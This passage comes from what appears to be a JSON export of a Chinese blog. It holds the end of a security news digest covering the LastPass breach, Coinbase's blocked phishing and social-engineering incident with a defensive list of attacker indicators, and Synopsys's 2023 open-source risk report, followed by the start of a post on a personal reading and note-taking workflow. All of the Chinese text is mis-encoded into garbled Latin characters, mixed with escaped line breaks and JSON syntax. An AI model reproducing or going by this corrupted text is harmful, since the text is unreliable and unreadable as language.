æ³•é€šè¿‡æœç´¢å¼•æ“ç›´æ¥æ£€ç´¢ã€‚\r\n\r\nLastPassè¿˜å‘å¸ƒä¸€ä»½é¢˜ä¸ºâ€œå®‰å…¨äº‹ä»¶æ›´æ–°ä¸å»ºè®®æ“ä½œâ€çš„PDFæ–‡æ¡£ï¼Œå…¶ä¸­åŒ…å«å…³äºè¿è§„å’Œå¤±çªƒæ•°æ®çš„æ›´å¤šä¿¡æ¯ã€‚\r\n![RhY2wU](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-03/RhY2wU.png)\r\n\r\nè¯¥å…¬å¸ä¹Ÿæ•´ç†äº†æ”¯æŒæ–‡ä»¶ï¼Œé¢å‘å…è´¹ã€ä»˜è´¹å’Œå®¶åº­å®¢æˆ·ä»¥åŠLastPass Businessç®¡ç†å‘˜æä¾›åº”å¯¹å»ºè®®ã€‚\r\n\r\né€šè¿‡å…¬å‘Šä¸­çš„å»ºè®®æ“ä½œï¼Œåº”å¯è¿›ä¸€æ­¥ä¿éšœæ‚¨çš„LastPassè´¦æˆ·ä¸ç›¸å…³é›†æˆã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://mp.weixin.qq.com/s/zvrwVei6Jy-zEDTkks7Ptg\r\n- https://arstechnica.com/information-technology/2023/02/lastpass-hackers-infected-employees-home-computer-and-stole-corporate-vault/\r\n- https://blog.lastpass.com/2023/03/security-incident-update-recommended-actions/\r\n\r\n\r\n### Coinbaseé­å—é’“é±¼æ”»å‡»ï¼Œä½†è¢«æˆåŠŸé˜»æ­¢\r\n\r\næˆ‘ä»¬çš„æ•…äº‹å¼€å§‹äº 2023 å¹´ 2 æœˆ 5 æ—¥æ˜ŸæœŸæ—¥çš„æ·±å¤œã€‚å‡ ä½å‘˜å·¥çš„æ‰‹æœºå¼€å§‹æé†’çŸ­ä¿¡ï¼Œè¡¨æ˜ä»–ä»¬éœ€è¦é€šè¿‡æä¾›çš„é“¾æ¥ç´§æ€¥ç™»å½•ä»¥æ¥æ”¶é‡è¦æ¶ˆæ¯ã€‚è™½ç„¶å¤§å¤šæ•°äººä¼šå¿½ç•¥è¿™æ¡è‡ªå‘çš„æ¶ˆæ¯ - ä¸€åå‘˜å·¥è®¤ä¸ºè¿™æ˜¯ä¸€æ¡é‡è¦ä¸”åˆæ³•çš„æ¶ˆæ¯ï¼Œç‚¹å‡»é“¾æ¥å¹¶è¾“å…¥ä»–ä»¬çš„ç”¨æˆ·åå’Œå¯†ç ã€‚ â€œç™»å½•â€åï¼Œç³»ç»Ÿä¼šæç¤ºå‘˜å·¥å¿½ç•¥è¯¥æ¶ˆæ¯å¹¶æ„Ÿè°¢éµå®ˆã€‚\r\n\r\næ¥ä¸‹æ¥å‘ç”Ÿçš„äº‹æƒ…æ˜¯ï¼Œæ”»å‡»è€…é…å¤‡äº†åˆæ³•çš„ Coinbase å‘˜å·¥ç”¨æˆ·åå’Œå¯†ç ï¼Œåå¤å°è¯•è¿œç¨‹è®¿é—® Coinbaseã€‚å¹¸è¿çš„æ˜¯ï¼Œæˆ‘ä»¬çš„ç½‘ç»œæ§åˆ¶å·²ç»å‡†å¤‡å°±ç»ªã€‚æ”»å‡»è€…æ— æ³•æä¾›æ‰€éœ€çš„å¤šå› ç´ èº«ä»½éªŒè¯ (MFA) å‡­æ®ï¼Œå› æ­¤æ— æ³•è·å¾—è®¿é—®æƒé™ã€‚åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œè¿™å°†æ˜¯æ•…äº‹çš„ç»“å±€ã€‚ä½†è¿™ä¸ä»…ä»…æ˜¯ä»»ä½•æ”»å‡»è€…ã€‚æˆ‘ä»¬è®¤ä¸ºæ­¤äººä¸è‡ªå»å¹´ä»¥æ¥ä¸€ç›´ä»¥æ•°åå®¶å…¬å¸ä¸ºç›®æ ‡çš„é«˜åº¦æŒä¹…å’Œå¤æ‚çš„æ”»å‡»æ´»åŠ¨æœ‰å…³ã€‚\r\n\r\nå¤§çº¦ 20 åˆ†é’Ÿåï¼Œæˆ‘ä»¬å‘˜å·¥çš„æ‰‹æœºå“äº†ã€‚æ”»å‡»è€…è‡ªç§°æ¥è‡ª Coinbase å…¬å¸ä¿¡æ¯æŠ€æœ¯ (IT)ï¼Œä»–ä»¬éœ€è¦è¯¥å‘˜å·¥çš„å¸®åŠ©ã€‚è¯¥å‘˜å·¥è®¤ä¸ºä»–ä»¬æ­£åœ¨ä¸åˆæ³•çš„ Coinbase IT å‘˜å·¥äº¤è°ˆï¼Œå› æ­¤ç™»å½•åˆ°ä»–ä»¬çš„å·¥ä½œç«™å¹¶å¼€å§‹æŒ‰ç…§æ”»å‡»è€…çš„æŒ‡ç¤ºè¿›è¡Œæ“ä½œã€‚è¿™å¼€å§‹äº†æ”»å‡»è€…å’Œä¸€åè¶Šæ¥è¶Šå¯ç–‘çš„å‘˜å·¥ä¹‹é—´çš„æ¥å›ã€‚éšç€è°ˆè¯çš„è¿›è¡Œï¼Œè¿™äº›è¦æ±‚å˜å¾—è¶Šæ¥è¶Šå¯ç–‘ã€‚å¹¸è¿çš„æ˜¯ï¼Œæ²¡æœ‰èµ„é‡‘è¢«ç›—ç”¨ï¼Œä¹Ÿæ²¡æœ‰å®¢æˆ·ä¿¡æ¯è¢«è®¿é—®æˆ–æŸ¥çœ‹ï¼Œä½†æˆ‘ä»¬å‘˜å·¥çš„ä¸€äº›æœ‰é™è”ç³»ä¿¡æ¯è¢«ç›—ç”¨ï¼Œç‰¹åˆ«æ˜¯å‘˜å·¥å§“åã€ç”µå­é‚®ä»¶åœ°å€å’Œä¸€äº›ç”µè¯å·ç ã€‚\r\n\r\nå¹¸è¿çš„æ˜¯ï¼Œæˆ‘ä»¬çš„è®¡ç®—æœºå®‰å…¨äº‹ä»¶å“åº”å°ç»„ (CSIRT) åœ¨æ”»å‡»å‘ç”Ÿåçš„å‰ 10 åˆ†é’Ÿå†…å°±è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚æˆ‘ä»¬çš„ CSIRT æ”¶åˆ°å®‰å…¨äº‹ä»¶å’Œäº‹ä»¶ç®¡ç† (SIEM) ç³»ç»Ÿçš„å¼‚å¸¸æ´»åŠ¨è­¦æŠ¥ã€‚æ­¤åä¸ä¹…ï¼Œæˆ‘ä»¬çš„ä¸€åäº‹ä»¶å“åº”äººå‘˜é€šè¿‡æˆ‘ä»¬çš„å†…éƒ¨ Coinbase æ¶ˆæ¯ç³»ç»Ÿè”ç³»äº†å—å®³è€…ï¼Œè¯¢é—®ä¸ä»–ä»¬çš„è´¦æˆ·ç›¸å…³çš„ä¸€äº›å¼‚å¸¸è¡Œä¸ºå’Œä½¿ç”¨æ¨¡å¼ã€‚æ„è¯†åˆ°äº‹æƒ…ä¸¥é‡é”™è¯¯åï¼Œè¯¥å‘˜å·¥ç»ˆæ­¢äº†ä¸æ”»å‡»è€…çš„æ‰€æœ‰é€šä¿¡ã€‚\r\n\r\næˆ‘ä»¬çš„ CSIRT å›¢é˜Ÿç«‹å³æš‚åœå—å®³å‘˜å·¥çš„æ‰€æœ‰è®¿é—®æƒé™å¹¶å±•å¼€å…¨é¢è°ƒæŸ¥ã€‚ç”±äºæˆ‘ä»¬çš„åˆ†å±‚æ§åˆ¶ç¯å¢ƒï¼Œæ²¡æœ‰èµ„é‡‘æŸå¤±ï¼Œä¹Ÿæ²¡æœ‰å®¢æˆ·ä¿¡æ¯è¢«æ³„éœ²ã€‚æ¸…ç†å·¥ä½œç›¸å¯¹è¾ƒå¿«ï¼Œä½†ä»ç„¶â€”â€”è¿™é‡Œæœ‰å¾ˆå¤šæ•™è®­è¦å¸å–ã€‚\r\n\r\n#### æŠ«éœ²çš„ä¸€äº›TTPs\r\n\r\n**é’“é±¼ç«™ç‚¹åŸŸåï¼š**\r\n- sso-*.com\r\n- *-sso.com\r\n- login.*-sso.com\r\n- dashboard-*.com\r\n- *-dashboard.com\r\n\r\n**æ¥è‡ªä»¥ä¸‹å‚å•†çš„æ¥ç”µ/çŸ­ä¿¡ï¼š**\r\n- Google Voice\r\n- Skype\r\n- Vonage/Nexmo\r\n- Bandwidth.com\r\n\r\n**ä½¿ç”¨äº†ä»¥ä¸‹æµè§ˆå™¨æ‰©å±•ï¼š**\r\n- [EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en)\r\n\r\n**ä»ç¬¬ä¸‰æ–¹ VPN æä¾›å•†ï¼ˆç‰¹åˆ«æ˜¯ Mullvad VPNï¼‰è®¿é—®æ‚¨çš„ç»„ç»‡çš„ä»»ä½•å°è¯•ã€‚**\r\n\r\n**ä½¿ç”¨ç¬¬ä¸‰æ–¹æœåŠ¡riseup[.]netæ¥å¤åˆ¶ç²˜è´´æ•°æ®ï¼ˆå¯ç”¨äºæ•°æ®å¤–ä¼ ï¼‰**\r\n\r\n**ä»¥ä¸‹è¿œç¨‹æ¡Œé¢å·¥å…·ï¼š**\r\n- AnyDesk (anydesk.com)\r\n- ISL åœ¨çº¿ (islonline.com)\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://www.coinbase.com/blog/social-engineering-a-coinbase-case-study\r\n\r\n## å®‰å…¨æŠ¥å‘Š\r\n### Synopsys 2023 å¼€æºå®‰å…¨ä¸é£é™©åˆ†ææŠ¥å‘Š\r\n\r\n> å­˜åœ¨æ¼æ´çš„å¼€æºä»£ç åº“æ¯”ä¾‹ç»§ç»­ä¿æŒè¿‘ä¸¤å¹´æ°´å¹³ï¼Œä½†å­˜åœ¨é«˜å±æ¼æ´çš„åº”ç”¨æ•°é‡å·²é™è‡³å››å¹´æ¥çš„æœ€ä½æ°´å¹³ã€‚\r\n\r\nè¿™æ˜¯æ ¹æ® Synopsys äº 2 æœˆ 22 æ—¥å‘å¸ƒçš„â€œ2023 å¼€æºå®‰å…¨å’Œé£é™©åˆ†æâ€(OSSRA) æŠ¥å‘Šå¾—å‡ºçš„ç»“è®ºã€‚è¯¥å¹´åº¦ç ”ç©¶åŸºäºå¯¹ 1,700 å¤šä¸ªåº”ç”¨ç¨‹åºçš„å®¡æ ¸ï¼Œå‘ç°å‡ ä¹æ¯ä¸ªè½¯ä»¶ç¨‹åº (96%) éƒ½åŒ…å«æŸç§å¼€æºè½¯ä»¶ç»„ä»¶ï¼Œå¹³å‡ä»£ç åº“åŒ…å« 76% çš„å¼€æºä»£ç ã€‚è™½ç„¶è‡³å°‘å­˜åœ¨ä¸€ä¸ªæ¼æ´çš„ä»£ç åº“æ•°é‡åœ¨è¿‡å»ä¸‰å¹´ä¸­åŸºæœ¬ä¿æŒç¨³å®šï¼Œç•¥é«˜äº 80%ï¼ˆ2022 å¹´ä¸º 84%ï¼‰ï¼Œä½†å…·æœ‰é«˜é£é™©æ¼æ´çš„åº”ç”¨ç¨‹åºæ•°é‡å·²ä¸‹é™è‡³çº¦ä¸€åŠ (48%)æµ‹è¯•çš„åº”ç”¨ç¨‹åºï¼Œä» 2020 å¹´çº¦ 60% çš„å³°å€¼å¼€å§‹ã€‚\r\n\r\nSynopsys Software Integrity Group çš„é«˜çº§è½¯ä»¶è§£å†³æ–¹æ¡ˆç»ç† Mike McGuire è¡¨ç¤ºï¼Œæ€»ä½“è€Œè¨€ï¼Œæ•°æ®æ˜¾ç¤ºäº†åœ¨ä¸æ˜“å—æ”»å‡»çš„ä¾èµ–é¡¹çš„æ–—äº‰ä¸­çš„ä¸€äº›äº®ç‚¹ï¼Œå…¶ä¸­å¹³å‡æ¯ä¸ªåº”ç”¨ç¨‹åºæœ‰ 595 ä¸ªï¼Œä½†æ²¡æœ‰æé«˜åº”ç”¨ç¨‹åºå®‰å…¨æ€§çš„å¹¿æ³›è¶‹åŠ¿ã€‚\r\n\r\n![gqIKuR](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-03/gqIKuR.jpg)\r\n\r\nå¼€æºç»„ä»¶ä»¥åŠæµè¡Œåº”ç”¨ç¨‹åºæ¡†æ¶æ‰€ä¾èµ–çš„ä¾èµ–é¡¹ç»§ç»­ä¸ºè½¯ä»¶åˆ¶é€ å•†å’Œåº”ç”¨ç¨‹åºå¼€å‘äººå‘˜å¸¦æ¥å®‰å…¨é—®é¢˜ã€‚ä¸€äº›ç»„ä»¶çš„æ™®éå­˜åœ¨â€”â€”ä¾‹å¦‚ Java ç”Ÿæ€ç³»ç»Ÿä¸­çš„ Log4jâ€”â€”ç»§ç»­å¯¼è‡´è®¸å¤šåŸºäºå¼€æºæ¡†æ¶çš„åº”ç”¨ç¨‹åºå‡ºç°å®‰å…¨é—®é¢˜ã€‚\r\n\r\nåŒ…å«å¤§é‡ç»„ä»¶ï¼ˆä»¥åŠè¿™äº›ç»„ä»¶çš„ä¾èµ–é¡¹ï¼‰çš„åº”ç”¨ç¨‹åºå¯èƒ½å…·æœ‰å¾ˆæ·±çš„ä¾èµ–å…³ç³»æ ‘ï¼Œè¿™ä½¿å¾—å¾ˆéš¾æ‰¾åˆ°æ¯ä¸ªæ¼æ´ã€‚ä¾‹å¦‚ï¼Œå‡ ä¹æ‰€æœ‰åº”ç”¨ç¨‹åº (91%) éƒ½åŒ…å«è‡³å°‘ä¸€ä¸ªåœ¨è¿‡å»ä¸¤å¹´å†…æ²¡æœ‰å¼€å‘çš„å¼€æºç»„ä»¶ï¼Œè¿™å¯èƒ½è¡¨æ˜è¯¥é¡¹ç›®ä¸å†ç»´æŠ¤ï¼Œå› æ­¤å­˜åœ¨å®‰å…¨é£é™©ã€‚\r\n\r\næŠ¥å‘Šç§°ï¼Œå…¶ä»–è¡Œä¸šå·²ç»å‡å°‘äº†å¯¹å¼€æºè½¯ä»¶çš„ä½¿ç”¨ï¼Œå¯èƒ½æ˜¯é€šè¿‡å°†æ›´å°‘çš„é¡¹ç›®æ•´åˆä¸ºä¾èµ–é¡¹ã€‚äº’è”ç½‘å’Œè½¯ä»¶åŸºç¡€è®¾æ–½éƒ¨é—¨ä»¥åŠç”µä¿¡å’Œæ— çº¿éƒ¨é—¨éƒ½å·²å°†å¼€æºè½¯ä»¶å¯¹å…¶ä»£ç åº“çš„è´¡çŒ®å‡å°‘åˆ° 60% ä»¥ä¸‹ã€‚è¿™ä¸¤ä¸ªè¡Œä¸šçš„é«˜å±æ¼æ´ä¹Ÿè¾ƒå°‘ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://news.synopsys.com/2023-02-22-Synopsys-Study-Underscores-Need-for-Comprehensive-SBOM-as-Best-Defense-in-Software-Supply-Chain-Security\r\n- https://www.synopsys.com/software-integrity/resources/analyst-reports/open-source-security-risk-analysis.html?cmp=pr-sig&utm_medium=referral\r\n"},{"fields":{"slug":"/çŸ¥è¯†ç®¡ç†/é˜…è¯»å­¦ä¹ å·¥ä½œæµ/","title":"é˜…è¯»å­¦ä¹ å·¥ä½œæµ"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: é˜…è¯»å­¦ä¹ å·¥ä½œæµ\r\ntags:\r\n - çŸ¥è¯†ç®¡ç†\r\n---\r\n\r\n# å‰è¨€\r\n> å¤§å¤šæ•°äººä¼šå¯¹è‡ªå·±çš„è®°å¿†åŠ›è¿‡åˆ†é«˜ä¼°ã€‚è¿™ä¸ªå¹»è§‰æ¥è‡ªæ¯æ—¶æ¯åˆ»éƒ½æœ‰ä¸€äº›ç¡®å®å¯ä»¥è®°å¾—ä½çš„ä¸œè¥¿ï¼Œè€Œè®°ä¸ä½çš„ä¸œè¥¿æ°æ°åˆ™å› ä¸ºæ²¡æœ‰è¢«è®°ä½æ‰€ä»¥çœ‹ä¸Šå»â€œå¹¶ä¸å­˜åœ¨â€ã€‚æ¢è¨€ä¹‹ï¼Œæ¯æ—¶æ¯åˆ»éƒ½æœ‰â€œæˆ‘è®°å¾—ä½â€çš„è¯æ®ï¼Œè€Œâ€œæˆ‘è®°ä¸ä½â€çš„è¯æ®åŸºæœ¬ä¸Šéš¾è§…å…¶è¸ªã€‚è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæ€»æœ‰é‚£ä¹ˆå¤šäººçœŸè¯šåœ°ç›¸ä¿¡è‡ªå·±è€ƒè¯•æˆç»©å·®æ˜¯å› ä¸ºâ€œæ²¡å‘æŒ¥å¥½â€ã€‚\r\n> ç›¸ä¿¡è‡ªå·±çš„è®°å¿†åŠ›æ¯”è‡ªå·±ä¼°è®¡å¾—å·®ï¼ˆç”šè‡³å·®å¾ˆå¤šï¼‰æ˜¯ä¸€ä¸ªå»é™¤è¿™ä¸€å¹»è§‰çš„è¡Œä¹‹æœ‰æ•ˆçš„æ–¹æ³•ï¼Œå› ä¸ºåªæœ‰ç›¸ä¿¡è¿™ä¸ªäº‹å®ï¼Œæ‰èƒ½å¤Ÿåœ¨å€¾å¬çš„æ—¶å€™æœ‰æ„è¯†åœ°ä¸ºäº†çœŸæ­£è®°ä½è€Œåå¤ï¼ˆè®¤çœŸï¼‰å›é¡¾ã€‚åœ¨ä¸€äº›é‡è¦åœºåˆï¼ˆè¯¾å ‚ã€ä¼šè®®ç­‰ï¼‰ï¼Œä¹Ÿä¼šå› æ­¤çœŸè¯šåœ°å€ŸåŠ©è¾…åŠ©å·¥å…·ï¼ˆç¬”è®°ã€ç…§ç‰‡ã€å½•éŸ³ç­‰ï¼‰æ¥å¸®åŠ©è®°å¿†ã€‚å¾ˆå¤šäººä»å°å°±å¯¹è€å¸ˆâ€œä¸€å®šè¦è®°ç¬”è®°â€çš„å»ºè®®ç½®è‹¥ç½”é—»ï¼Œå‡†ç¡®åœ°è®²ï¼Œè¿™ç§è¡Œä¸ºå¹¶éå‡ºè‡ªå¯¹è€å¸ˆçš„å¿½è§†æˆ–è€…é„™è§†ï¼Œè€Œæ˜¯å‡ºè‡ªå¯¹è‡ªå·±è®°å¿†åŠ›â€œå¹»è§‰â€çš„ä¿¡ä»»ã€‚\r\n> \r\n> â€”â€”ã€ŠæŠŠæ—¶é—´å½“ä½œæœ‹å‹ã€‹\r\n\r\nFrom [time-as-a-friend/Chapter6.md at master Â· xiaolai/time-as-a-friend](https://github.com/xiaolai/time-as-a-friend/blob/master/Chapter6.md)\r\næ¯å¤©æˆ‘éƒ½ä¼šåœ¨ç¢ç‰‡åŒ–çš„æ—¶é—´å¬åˆ°ã€çœ‹åˆ°ã€è¯»åˆ°å„ç§ä¿¡æ¯ï¼Œè€Œç»å¤§éƒ¨åˆ†å†…å®¹å´æˆä¸ºè¿‡çœ¼çƒŸäº‘ï¼Œå”¯ä¸€çš„æ”¶è·ä¾¿æ˜¯è®©æˆ‘äº§ç”Ÿå­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿çš„å¹»è§‰ã€‚å³ä½¿æŠŠè¿™äº›ä¿¡æ¯å­˜å…¥ç¬”è®°è½¯ä»¶ï¼Œä¹Ÿä¼šé™·å…¥ã€Œæ”¶è—å³å­¦ä¹ ã€çš„é™·é˜±ï¼Œç»å¤§éƒ¨åˆ†çŸ¥è¯†æ”¶è—çš„å†…å®¹æ”¶è—ä¹‹åï¼Œå†ä¹Ÿæ²¡æœ‰æ‰“å¼€ã€‚\r\n\r\n> ã€Œæ”¶è—å³å­¦ä¹ ã€çš„é™·é˜±å¯ä»¥å°è¯•ä½¿ç”¨è´¹æ›¼å­¦ä¹ æ³•æ¥ç ´å±€ï¼Œå»ºç«‹æ­£å‘åé¦ˆæœºåˆ¶ï¼Œå®ç°ä»æ”¶è—è€…åˆ°åˆ›ä½œè€…çš„è½¬å˜ã€‚\r\n\r\nä¸ºäº†è§£å†³å‰é¢æåˆ°çš„å›°å¢ƒï¼Œæˆ‘è¯»äº†å¾ˆå¤šå…³äºä¸ªäººçŸ¥è¯†ç®¡ç†æœ‰å…³çš„ä¹¦ç±å’Œæ–‡ç« ï¼Œç»“åˆè‡ªå·±çš„éœ€æ±‚ï¼Œåˆ›å»ºäº†è‡ªå·±çš„é˜…è¯»å­¦ä¹ å·¥ä½œæµã€‚\r\n\r\n# æ•´ä½“æµç¨‹\r\nå·¥ä½œæµåŒ…æ‹¬ä¸‰ä¸ªæ¨¡å—ï¼š**è·å–ä¿¡æ¯ã€é˜…è¯»ä¿¡æ¯å’Œæ•´ç†è¾“å‡º**ï¼Œåˆ©ç”¨è¾“å…¥å¼ºåŒ–è¾“å‡ºï¼Œè¾“å‡ºå€’é€¼è¾“å…¥ï¼Œè·µè¡Œ[è´¹æ›¼å­¦ä¹ æ³•](https://www.liaolijun.com/feynman-technique/)ï¼Œå…¶ä¸­æ¯ä¸ªæ¨¡å—é™„ä¸Šäº†æˆ‘å¸¸ç”¨çš„å·¥å…·ï¼Œä¾›å‚è€ƒã€‚\r\n\r\n![Created by draw.io](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/TBhwNH.jpg)\r\n## è·å–ä¿¡æ¯\r\n| ç±»å‹       | è·å–å‘¨æœŸ | è®¢é˜…å·¥å…· | å­˜å‚¨å·¥å…·     | æ¨èé˜…è¯»                |\r\n| ---------- | -------- | -------- | ------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\r\n| RSS        | æ¯æ—¥     | Feedly   | Notion       | [ä¸é‚£ä¹ˆå®Œç¾çš„ RSS è®¢é˜…æ–¹æ¡ˆ â€” feedly + RSSHub](https://sspai.com/post/59501)                                                                                                                                                                  |\r\n| Newsletter | æ¯å‘¨     | Matter   | Notion       | [è¯•ç”¨ iOS ä¸Šçš„é˜…è¯»åº”ç”¨ Matter](https://sspai.com/post/68585)                                                                                                                                                                                 |\r\n| Podcast    | æ¯å‘¨     | Spotify  | Siyuan       | [THE RISE OF PODCASTS AND WHAT SPOTIFY HAS TO DO WITH IT](https://epic-tv.com/events/blog/the-rise-of-podcasts-and-what-spotify-has-to-do-with-it/#:~:text=Spotify%20uses%20podcasting%20to%20help,series%20that%20ran%20throughout%202018.) |\r\n| ä¹¦ç±       | æ¯å‘¨     | äººè‚‰     | Siyuan       | [â€œæ— ç¦»çº¿ä¸ç¬”è®°â€ä¸ºä»€ä¹ˆæˆ‘è¦é€‰æ‹©æ€æºç¬”è®°ï¼Ÿ](https://zhuanlan.zhihu.com/p/399935581)                                                                                                                                                             |\r\n| å…¬ä¼—å·     | ç¢ç‰‡æ—¶é—´ | å¾®ä¿¡     | ç®€çº¦, Notion | [å»ºç«‹å¼ºå¤§çš„ Notion æ•°æ®åº“ï¼Œä»äº†è§£å‡½æ•°å¼€å§‹](/3f1e9e5c14b24df69aa9c3b3334381f1)                                                                                                                                                                |\r\n| Twitter           |     ç¢ç‰‡æ—¶é—´     |    Twitter      |     ç®€çº¦, Notion         |                    N/A                                                                                                                                                                                                                          |\r\n|     ç½‘é¡µ      |     ç¢ç‰‡æ—¶é—´     |    Google     |       ç®€çº¦, Notion     |           [é˜…è¯»æ¨¡å¼ + æ ‡æ³¨ç³»ç»Ÿ + ç¨åè¯»ï¼Œç®€æ‚¦ 2.0 æƒ³æˆä¸ºä½ çš„çŸ¥è¯†ç®¡ç†è§£å†³æ–¹æ¡ˆ](https://sspai.com/post/61996)                                                                                                                                                                                                                                   |\r\n|     çµæœºä¸€åŠ¨       |    ç¢ç‰‡æ—¶é—´      |     Flomo     |      Flomo, Notion, Siyuan        |          [flomo æµ®å¢¨ç¬”è®°çš„èƒŒåï¼Œè—ç€ä»€ä¹ˆæ ·çš„ç†å¿µ](https://sspai.com/post/64009)                                                                                                                                                                                                                                    |\r\nåœ¨è·å–ä¿¡æ¯é˜¶æ®µï¼Œç›¸å…³çš„æ•°æ®æºå°±ä¸èµ˜è¿°äº†ï¼Œé‡ç‚¹è®²è®²å‡ ä¸ªå·¥å…·ï¼š\r\n\r\n1. Feedly\r\n    ä¸»æµçš„RSSè®¢é˜…è½¯ä»¶ä½¿ç”¨èµ·æ¥å·®åˆ«ä¸å¤§ï¼Œé€‰æ‹©è‡ªå·±é¡ºæ‰‹çš„å°±è¡Œã€‚\r\n2. Matter\r\n    å¯ä»¥ä½¿ç”¨Matteræä¾›çš„é‚®ç®±æ¥è®¢é˜…Newsletterï¼Œåœ¨ç§»åŠ¨ç«¯ç”¨æˆ·ä½“éªŒè¿˜ä¸é”™ã€‚\r\n3. Spotify\r\n    ä¸ºäº†å¬å¢™å¤–çš„podcastèŠ‚ç›®ï¼Œä¸”å¤§éƒ¨åˆ†çš„podcastéƒ½ä¼šåœ¨Spotifyåˆ†å‘ã€‚ï¼ˆSpotifyå›½å†…å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼‰\r\n4. Flomo\r\n    è½¯ä»¶åŠŸèƒ½ç®€å•ï¼Œè¾“å…¥æ‘©æ“¦å¾ˆå°ï¼Œè®¾è®¡è®©äººæœ‰åŠ¨åŠ›å¼€å§‹è®°å½•ï¼Œä¹Ÿéå¸¸é’¦ä½©åˆ›å§‹äºº[å°‘æ¥ ](https://www.notion.so/Plidezus-ff9bdac2b40e4ad2be23192a8c43f5fd)ã€‚\r\n\r\n## é˜…è¯»å’Œç¬”è®°\r\n\r\nåœ¨è¿™ä¸ªé˜¶æ®µï¼Œæˆ‘ä»¥Siyuan (æ€æºç¬”è®°)ä¸ºæ ¸å¿ƒï¼Œå¯¹å„ç§ä¿¡æ¯è¿›è¡Œé˜…è¯»ã€å­¦ä¹ ã€æ•´ç†ï¼Œé‡‡ç”¨**Zettelkastenå¡ç‰‡ç›’ç¬”è®°æ³•**ï¼ˆ[å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ](https://sspai.com/post/60802)ï¼‰æ¥å¯¹çŸ¥è¯†ç‚¹è¿›è¡Œå¡ç‰‡åŒ–å’Œç›¸äº’è¿æ¥ï¼Œåœ¨daily noteä¸­å†™è‡ªç”±å†™ä½œï¼ˆè€Œæ— éœ€å…³å¿ƒç¬”è®°åˆ†ç±»ï¼‰ï¼Œç»“åˆåŒé“¾çš„æ–¹å¼è®©ç¬”è®°è‡ªç„¶ç”Ÿé•¿ã€‚\r\n\r\nåœ¨é˜…è¯»çš„è¿‡ç¨‹ä¸­ï¼Œæ‰¹æ³¨æ˜¯å¾ˆè‡ªç„¶çš„äº‹ï¼Œ**ç®€æ‚¦**çš„ä¸»æ‰“åŠŸèƒ½**â€é˜…è¯»æ¨¡å¼ + å‰ªè— + æ ‡æ³¨â€œ**å¾ˆå¥½çš„å®ç°äº†è¿™ä¸€ç‚¹ï¼ŒçœŸæ­£æå‡äº†ç½‘é¡µé˜…è¯»çš„æ•ˆèƒ½ï¼Œå¯ä»¥è¯´æ˜¯ç”Ÿäº§åŠ›å·¥å…·ã€‚\r\n\r\nå°†**ç®€æ‚¦**å‰ªè—çš„ç½‘é¡µ+æ ‡æ³¨é€šè¿‡APIè‡ªåŠ¨å¯¼å…¥**Notion**åï¼Œåœ¨å†™ä½œ/ä½¿ç”¨æ—¶ï¼Œå°±èƒ½åœ¨**Notion**ä½¿ç”¨å…¨å±€æœç´¢ï¼Œå¿«é€Ÿæ‰¾åˆ°æ‰€éœ€è¦çš„èµ„æ–™ã€‚ï¼ˆPocket/Instapperè¿˜éœ€è¦å¼€é€šä¼šå‘˜æ‰èƒ½å…¨æ–‡æ£€ç´¢ï¼‰\r\n\r\nè¿™ä¸ªæ—¶å€™æˆ‘ä½¿ç”¨çš„å·¥å…·å¦‚ä¸‹ï¼š\r\n\r\n1. Notion\r\n    æ ¸å¿ƒä¼˜åŠ¿æ˜¯å¼ºå¤§çš„DatabaseåŠŸèƒ½ï¼Œéå¸¸é€‚åˆåšæ•°æ®çš„æ•´ç†ã€ç»Ÿè®¡å’Œå…³è”ç­‰åŠŸèƒ½ï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒé¡µé¢åˆ†äº«å’Œå¤šäººåä½œï¼Œæœ¬ç«™å…¶å®å°±æ˜¯Notionåˆ†äº«çš„Pageï¼›ä½†æ•°æ®å­˜åœ¨äº‘ç«¯ï¼Œå¯¹æ•°æ®å®‰å…¨æœ‰ç–‘è™‘çš„åŒå­¦ä¸å»ºè®®ä½¿ç”¨ã€‚\r\n2. Siyuan (æ€æºç¬”è®°)\r\n    åŒé“¾ç¬”è®°è½¯ä»¶éå¸¸å¤šï¼Œæˆ‘ä¹Ÿä½“éªŒè¿‡è¿‘ä¸¤å¹´ç«çˆ†çš„Roam researchã€Obsidianå’ŒLogsegä¹‹ç±»çš„ç¬”è®°è½¯ä»¶ï¼Œæœ€ç»ˆé€‰æ‹©æ€æºç¬”è®°çš„åŸå› æœ‰ä¸¤ä¸ªï¼šä¸€ã€å¤§çº²+Blockçš„å†™ä½œæ–¹å¼æ›´åŠ è‡ªç”±ã€‚äºŒã€æœ¬åœ°åŒ–ç¤¾åŒºæ”¯æŒï¼Œå¼€å‘è€…[D](https://github.com/88250)å’Œ[V](https://github.com/Vanessa219)ä¼šç»å¸¸ç­”ç–‘ã€‚ä¸‰ã€æ•°æ®æœ¬åœ°å­˜å‚¨æ›´åŠ å®‰å…¨ï¼Œäº‘ç«¯å­˜å‚¨å¯ç«¯åˆ°ç«¯åŠ å¯†ã€‚\r\n3. ç®€æ‚¦\r\n    æ²‰æµ¸å¼é˜…è¯»ä½“éªŒï¼Œå¼ºå¤§çš„åˆ’è¯æ‰¹æ³¨åŠŸèƒ½ï¼Œè¿˜èƒ½æ‰“é€šå…¶ä»–ç”Ÿäº§åŠ›å·¥å…·ï¼ˆå¦‚Notionï¼‰ã€‚\r\n\r\n## æ•´ç†è¾“å‡º\r\n\r\næˆ‘ä¼šä½¿ç”¨Siyuan (æ€æºç¬”è®°) 